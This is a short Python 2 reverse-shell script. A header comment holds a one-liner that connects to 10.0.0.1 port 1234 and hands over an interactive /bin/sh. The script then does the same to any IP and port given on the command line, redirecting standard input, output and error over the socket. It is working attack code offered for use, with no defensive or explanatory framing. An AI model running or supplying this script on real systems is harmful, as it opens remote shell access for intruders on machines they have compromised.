#!/usr/local/bin/python
# one liner example:
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
#           s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
#           os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

import socket
import subprocess
import os
import sys


def usage():
    print 'USAGE: %s <ip_or_fqdn> <port_number>' % sys.argv[0]


def start_rev_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
    return p


def main():
    if len(sys.argv) < 2:
        print 'Err: Something went wrong. Did you check usage ?'
        usage()
        sys.exit(1)
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        start_rev_shell(ip, port)

main()